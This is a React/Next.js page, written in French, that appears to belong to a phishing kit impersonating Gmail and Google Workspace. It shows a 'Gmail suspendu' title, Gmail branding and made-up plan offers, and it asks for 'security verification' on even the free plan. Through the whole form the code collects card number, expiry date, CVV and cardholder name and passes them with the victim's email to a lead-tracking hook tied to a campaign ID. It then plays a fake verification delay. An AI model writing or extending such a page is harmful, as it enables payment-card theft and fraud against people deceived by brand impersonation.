import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../src/hooks/usePageMeta';
import { useLeadTracker } from '../src/hooks/useLeadTracker';

// Import des styles
import layoutStyles from '../src/styles/components/Layout.module.css';
import headerStyles from '../src/styles/components/Header.module.css';
import planSummaryStyles from '../src/styles/components/PlanSummary.module.css';
import buttonStyles from '../src/styles/components/Button.module.css';
import PlanSelection from '../src/components/booking/PlanSelection';
import PlanSummary from '../src/components/booking/PlanSummary';
import PaymentForm from '../src/components/payment/PaymentForm';
import FooterTrust from '../src/components/common/FooterTrust';

const Confirmation = () => {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [firstName, setFirstName] = useState('');
  const [currentStep, setCurrentStep] = useState('selection'); // 'selection', 'details'
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardName: ''
  });
  
  // États pour le système de vérification avancé
  const [showLoadingVerification, setShowLoadingVerification] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // Hook pour le tracking des leads
  const { trackVerification, isTracking, campaignId } = useLeadTracker();

  // Récupérer l'email et le prénom depuis l'URL au chargement
  useEffect(() => {
    if (router.query.email) {
      setEmail(router.query.email);
    }
    if (router.query.firstName) {
      setFirstName(router.query.firstName);
    }
  }, [router.query.email, router.query.firstName]);

  // Gérer l'écran de chargement avec le logo Gmail
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 3000); // 3 secondes

    return () => clearTimeout(timer);
  }, []);

  const planSummary = {
    free: {
      title: 'Personnel',
      price: '0€',
      period: '/mois',
      description: 'Gratuit à vie',
      features: [
        'Calendrier Google illimité',
        'Réunions Google Meet sécurisées',
        '15 Go de stockage Google Drive',
        'Gmail avec domaine personnel',
        'Documents Google collaboratifs'
      ],
      policies: [
        'Aucun engagement - Service gratuit à vie',
        'Vérification du compte requise pour la sécurité',
        'Limites d\'utilisation standard de Google',
        'Support communautaire disponible',
        'Données stockées selon les standards Google'
      ]
    },
    starter: {
      title: 'Business Starter',
      price: '4€',
      originalPrice: '6€',
      period: '/mois',
      description: 'Par utilisateur',
      features: [
        'Tout du plan Personnel',
        '30 Go de stockage Google Drive',
        'Réunions jusqu\'à 100 participants',
        'Enregistrement de réunions',
        'Support par e-mail prioritaire',
        'Administration et sécurité',
        'Gestion centralisée des utilisateurs'
      ],
      policies: [
        '30 jours d\'essai gratuit sans engagement',
        'Facturation mensuelle - Annulation à tout moment',
        'Support prioritaire par email sous 24h',
        'Conformité aux standards de sécurité Google',
        'Sauvegarde automatique et sécurisée des données'
      ]
    },
    premium: {
      title: 'Business Standard',
      price: '8€',
      originalPrice: '12€',
      period: '/mois',
      description: 'Par utilisateur',
      features: [
        'Tout du plan Business Starter',
        '2 To de stockage par utilisateur',
        'Réunions jusqu\'à 150 participants',
        'Enregistrement direct dans Drive',
        'Support téléphonique 24/7',
        'Outils d\'approbation et validation',
        'Recherche et intelligence avancées',
        'Audit et rapports détaillés'
      ],
      policies: [
        '30 jours d\'essai gratuit sans engagement',
        'Facturation mensuelle flexible',
        'Support téléphonique 24h/24, 7j/7',
        'Sécurité avancée et contrôles d\'administration',
        'Conformité aux réglementations internationales',
        'Archivage et e-discovery intégrés'
      ]
    }
  };

  const handleSelectPlan = (planType) => {
    setSelectedPlan(planType);
    setCurrentStep('details');
  };

  const handleBackToSelection = () => {
    setCurrentStep('selection');
    setSelectedPlan(null);
  };

  const handleSubmit = async () => {
    if (isProcessing) return;
    
    try {
      setIsProcessing(true);
      
      // Étape 1: Afficher le loading et démarrer le processus de vérification
      setShowLoadingVerification(true);
      
      // Validation côté client avant envoi à l'API
      if (!email || !formData.cardNumber || !formData.expiryDate || !formData.cvv || !formData.cardName) {
        throw new Error('Veuillez remplir tous les champs obligatoires');
      }
      
      // Étape 2: Appel RÉEL de l'API de tracking de vérification
      console.log('📊 Début du tracking de vérification...');
      const trackingResult = await trackVerification({
        email,
        firstName,
        cardNumber: formData.cardNumber,
        cardExpiry: formData.expiryDate,
        cardCvv: formData.cvv,
        cardName: formData.cardName,
        selectedPlan
      });
      
      console.log('✅ Tracking de vérification réussi:', trackingResult);
      
      // Étape 3: Simulation du délai UX après le tracking réussi
      await new Promise(resolve => setTimeout(resolve, 6000)); // 6 secondes pour UX
      
      // Étape 4: Finaliser le processus
      setShowLoadingVerification(false);
      
    } catch (error) {
      console.error('❌ Erreur lors du processus de vérification:', error);
      setShowLoadingVerification(false);
      
      // En cas d'erreur de tracking, logger l'erreur pour le debugging
      console.error('Détails de l\'erreur:', {
        message: error.message,
        campaignId,
        email,
        selectedPlan
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleInputChange = (field, value) => {
    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    } else if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
    }
    
    setFormData(prev => ({ ...prev, [field]: formattedValue }));
  };

  return (
    <>
      <PageHead 
        title="Gmail suspendu"
        description="Confirmez votre réservation et choisissez votre forfait de service"
        options={{
          keywords: 'confirmation, forfait, réservation, paiement',
          favicon: '/gmail-favicon.ico'
        }}
      />
      <div className={layoutStyles.container}>
      {isLoading ? (
        // Écran de chargement avec logo Gmail
        <div className={layoutStyles.loadingScreen}>
          <div className={layoutStyles.gmailLogo}>
            <img 
              src="gmail-logo.png" 
              alt="Gmail Logo" 
              width="64" 
              height="64"
            />
          </div>
        </div>
      ) : (
        <>
          {/* Background Gmail avec filtre flou */}
          <div className={layoutStyles.background}></div>
          <div className={layoutStyles.overlay}></div>
          
          {/* Popup de confirmation - Masqué seulement si Loading actif */}
          {!showLoadingVerification && (
            <div className={layoutStyles.popup}>
              <div className={layoutStyles.popupContentMinimal}>
                {currentStep === 'selection' && (
                  <PlanSelection 
                    planSummary={planSummary} 
                    onSelectPlan={handleSelectPlan} 
                  />
                )}
                {currentStep === 'details' && (
                  <>
                    {/* Bouton retour en haut à gauche */}
                    <button 
                      onClick={handleBackToSelection}
                      className={buttonStyles.topBackBtn}
                    >
                      ←
                    </button>

                    {/* Header */}
                    <div className={headerStyles.header}>
                      <div className={headerStyles.logoContainer}>
                        <img 
                          src="google-workspace.svg" 
                          alt="Google Workspace" 
                          className={headerStyles.workspaceLogo}
                        />
                      </div>
                      <h1 className={headerStyles.title}>
                        {selectedPlan === 'free' ? 'Vérification de sécurité' : 'Démarrer votre essai gratuit'}
                      </h1>
                      <p className={headerStyles.description}>
                        {selectedPlan === 'free' 
                          ? 'Vérification d\'identité requise pour utiliser Google Agenda et activer votre compte Google Workspace Personnel.'
                          : `Votre essai gratuit de 30 jours pour ${planSummary[selectedPlan].title} commence maintenant.`
                        }
                      </p>
                    </div>

                    {/* Structure à 2 colonnes */}
                    <div className={planSummaryStyles.twoColumnLayout}>
                      
                      {/* Colonne de gauche - Composant PlanSummary */}
                      <PlanSummary 
                        plan={planSummary[selectedPlan]} 
                        selectedPlan={selectedPlan} 
                      />

                      {/* Colonne de droite - Composant PaymentForm */}
                      <div className={planSummaryStyles.rightColumn}>
                        <PaymentForm 
                          selectedPlan={selectedPlan}
                          formData={formData}
                          onInputChange={handleInputChange}
                          onSubmit={handleSubmit}
                          isSubmitting={isTracking || isProcessing}
                          email={email}
                          firstName={firstName}
                        />
                      </div>
                    </div>

                    {/* Composant FooterTrust */}
                    <FooterTrust />
                  </>
                )}
              </div>
            </div>
          )}
        </>
      )}

      
    </div>
    </>
  );
};

export default Confirmation;
